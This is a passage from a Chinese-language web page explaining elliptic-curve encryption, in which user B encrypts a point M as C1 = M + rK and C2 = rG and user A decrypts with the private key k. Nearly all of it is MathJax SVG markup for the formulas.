440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path></g><g data-mml-node="mi" transform="translate(771,-150) scale(0.707)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g><g data-mml-node="mo" transform="translate(1176.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1565.7,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(2094.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(2539.3,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mo" transform="translate(2968.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>上一点M，并产生一个随机整数<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="8.175ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3613.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(451,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(840,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1568.8,0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="mi" transform="translate(2624.6,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(3224.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，加密开始；</li>
<li>用户B计算点<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="13.798ex" height="1.934ex" role="img" focusable="false" viewBox="0 -705 6098.6 855"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mn" transform="translate(748,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1429.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2485.1,0)"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mo" transform="translate(3758.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(4758.6,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(5209.6,0)"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g></g></g></svg></mjx-container>，<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="8.421ex" height="1.934ex" role="img" focusable="false" viewBox="0 -705 3722.1 855"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mn" transform="translate(748,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1429.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2485.1,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(2936.1,0)"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g></g></g></svg></mjx-container>；</li>
<li>用户B将<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="2.605ex" height="1.934ex" role="img" focusable="false" viewBox="0 -705 1151.6 855"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mn" transform="translate(748,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></svg></mjx-container>、<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="2.605ex" height="1.934ex" role="img" focusable="false" viewBox="0 -705 1151.6 855"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mn" transform="translate(748,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></g></svg></mjx-container>传给用户A；</li>
<li>用户A接到信息后，计算<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="53.941ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 23842 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mn" transform="translate(748,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1373.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(2374,0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="msub" transform="translate(2895,0)"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mn" transform="translate(748,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(4324.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(5380.1,0)"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mo" transform="translate(6653.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(7653.6,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(8104.6,0)"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g><g data-mml-node="mo" transform="translate(9215.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(10216,0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mo" transform="translate(10737,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(11126,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(11577,0)"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mo" transform="translate(12363,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(13029.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 